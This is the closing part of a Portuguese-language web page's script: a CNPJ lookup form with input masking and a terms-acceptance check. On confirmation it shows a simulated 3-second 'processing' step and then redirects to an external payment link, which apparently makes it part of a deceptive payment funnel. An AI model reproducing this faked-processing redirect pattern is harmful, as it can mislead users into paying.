            checkboxes.forEach(checkbox => {
                if (!checkbox.checked) {
                    allChecked = false;
                    checkbox.style.outline = '2px solid var(--error-color)';
                } else {
                    checkbox.style.outline = 'none';
                }
            });

            if (!allChecked) {
                alert('Por favor, aceite todos os termos para continuar.');
                return;
            }

            const submitBtn = e.target.querySelector('button[type="submit"]');
            const loadingOverlay = document.getElementById('loadingOverlay');

            if (submitBtn) submitBtn.classList.add('btn-loading');
            if (loadingOverlay) loadingOverlay.style.display = 'flex';

            try {
                await new Promise(resolve => setTimeout(resolve, 3000));
                window.location.href = 'https://pay.pag-br.com/r/30HZ97EEkQ4U1E605Z';
            } catch (error) {
                console.error('Erro:', error);
                alert('Erro ao processar solicitação. Tente novamente.');
            } finally {
                if (submitBtn) submitBtn.classList.remove('btn-loading');
                if (loadingOverlay) loadingOverlay.style.display = 'none';
            }
        }

        // ===== INICIALIZAÇÃO =====
        document.addEventListener('DOMContentLoaded', function() {
            // Formulário CNPJ
            const cnpjForm = document.getElementById('cnpjForm');
            if (cnpjForm) {
                cnpjForm.addEventListener('submit', handleCNPJFormSubmit);

                const prosseguirBtn = document.getElementById('btn-prosseguir');
                if (prosseguirBtn) {
                    prosseguirBtn.addEventListener('click', () => {
                        if (cnpjData) { // Verifica se os dados do CNPJ foram carregados
                            goToStep(2);
                        } else {
                            showCNPJError('Por favor, digite um CNPJ válido para a busca antes de prosseguir.');
                        }
                    });
                }
            }

            // Máscara de CNPJ
            const cnpjInput = document.getElementById('cnpj');
            if (cnpjInput) {
                cnpjInput.addEventListener('input', function(e) {
                    const cursorPosition = e.target.selectionStart;
                    const oldValue = e.target.value;
                    const newValue = applyCNPJMask(oldValue);

                    if (newValue !== oldValue) {
                        e.target.value = newValue;
                        const newCursorPosition = cursorPosition + (newValue.length - oldValue.length);
                        e.target.setSelectionRange(newCursorPosition, newCursorPosition);
                    }

                    // Busca automática quando CNPJ está completo
                    if (newValue.replace(/\D/g, '').length === 14) {
                        handleCNPJLookup();
                    }
                });
            }

            // Formulário de Confirmação
            const confirmationForm = document.getElementById('confirmationForm');
            if (confirmationForm) {
                confirmationForm.addEventListener('submit', handleConfirmationSubmit);
            }
        });
    </script>
</body>
</html>
